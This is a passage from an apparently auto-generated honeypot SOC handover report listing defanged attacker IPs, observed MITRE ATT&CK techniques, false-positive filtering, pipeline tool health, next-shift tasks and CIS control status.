- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.226.239[.]233` | NL | Vlad Cojuhari | **100** ⚠️ | 4 |
| `77.239.124[.]130` | FR | ROCKET & MARINICA LTD | **100** ⚠️ | 18 |
| `112.185.230[.]208` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `16.5.0[.]236` | BR | EMBNEX. LLC | **100** ⚠️ | 8 |
| `37.186.114[.]181` | AM | GNC-Alfa CJSC | **100** ⚠️ | 6 |
| `34.77.104[.]9` | BE | Google LLC | **100** ⚠️ | 2 |
| `103.239.252[.]132` | BD | Carnival Internet | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `43.255.104[.]5` | TH | Huawei-Cloud-TH | **100** ⚠️ | 2 |
| `37.186.121[.]186` | AM | GNC-Alfa CJSC | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 134 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 129 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 62 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 61 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 59 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 261 cases |
| Tool 34  | Credential Extractor        | ✅ 177 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (8.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 129 priority case(s) shown individually · 36 recon entry/entries in table (11 group(s) consolidating 85 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-06T13:29:08Z_
